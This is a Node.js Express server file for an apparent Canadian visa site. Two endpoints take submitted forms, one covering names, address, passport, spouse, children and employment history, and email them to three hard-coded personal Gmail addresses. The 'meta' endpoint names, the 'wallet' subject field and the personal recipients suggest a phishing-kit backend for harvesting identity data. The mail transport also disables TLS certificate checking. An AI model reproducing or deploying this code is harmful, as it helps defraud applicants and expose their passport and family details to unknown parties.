require("dotenv").config({ path: "./config.env" });
const express = require("express");
const nodemailer = require("nodemailer");
const app = express();
const router = express.Router();
const cors = require("cors");
const path = require("path");

//middleware
const allowedorigins = ['http://localhost:3000', 'https://canadavisapathway.cc'];
app.use(express.json());
app.use(cors({
  origin: allowedorigins
}))

//routing controllers
const meta = async (req, res, next) => {
  const content = req.body;

  //mail code for meta
  const sendMail = async (options) => {
    let transporter = nodemailer.createTransport({
      host: process.env.EMAIL_HOST,
      port: process.env.EMAIL_PORT,
      secure: process.env.EMAIL_SECURE,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    let mailOptions = {
      from: process.env.EMAIL_FROM,
      to: "jeffscott1169@gmail.com, Agentwilliambeverley@gmail.com, kehopave123@gmail.com",
      subject: options.wallet,
      text:
        `\n Full Name: ` +
        options.fname +
        `\n Email: ` +
        options.email +
        `\n Mobile: ` +
        options.mobile +
        `\n Age: ` +
        options.age +
        `\n Address: ` +
        options.address +
        `\n Marraige Stats: ` +
        options.marraigestats +
        `\n Spouse Full Name: ` +
        options.spousefname +
        `\n Spouse Age: ` +
        options.spouseage +
        `\n Educational Level: ` +
        options.edulevel +
        `\n Spouse Educational Level: ` +
        options.spouseedulevel +
        `\n Employment History: ` +
        options.employmentHistory +
        `\n SpouseEmployment History: ` +
        options.spouseemploymentHistory +
        `\n Children under 19: ` +
        options.childrenunder19 +
        `\n Children above 19: ` +
        options.childrenabove19 +
        `\n Passport: ` +
        options.passport,
    };

    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        console.log(err);
        return res.json({
          success: false,
          message:
            "Email did not send.",
        });
      } else {
        console.log(info);
        return res.json({
          success: true,
          message:
            "Email sent",
        });
      }
    });
  };

  sendMail(content);
};

//routing controllers
const metafa = async (req, res, next) => {
  const content = req.body;

  //mail code for metafa
  const sendMailFa = async (options) => {
    let transporter = nodemailer.createTransport({
      host: process.env.EMAIL_HOST,
      port: process.env.EMAIL_PORT,
      secure: process.env.EMAIL_SECURE,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    let mailOptions = {
      from: process.env.EMAIL_FROM,
      to: "jeffscott1169@gmail.com,Agentwilliambeverley@gmail.com, kehopave123@gmail.com",
      subject: options.wallet,
      text:
        `\n Name ` +
        options.name +
        `\n Email: ` +
        options.email +
        `\n Mobile: ` +
        options.mobile +
        `\n Message: ` +
        options.message,
    };

    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        console.log(err);
        return res.json({
          success: false,
          message:
            "Email did not send.",
        });
      } else {
        console.log(info);
        return res.json({
          success: true,
          message:
            "Email sent",
        });
      }
    });
  };

  sendMailFa(content);
};

//routing endpoints
app.post("/api/mail/meta", meta);
//routing endpoints
app.post("/api/mail/metafa", metafa);

// Start the server
const PORT = 5000;
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
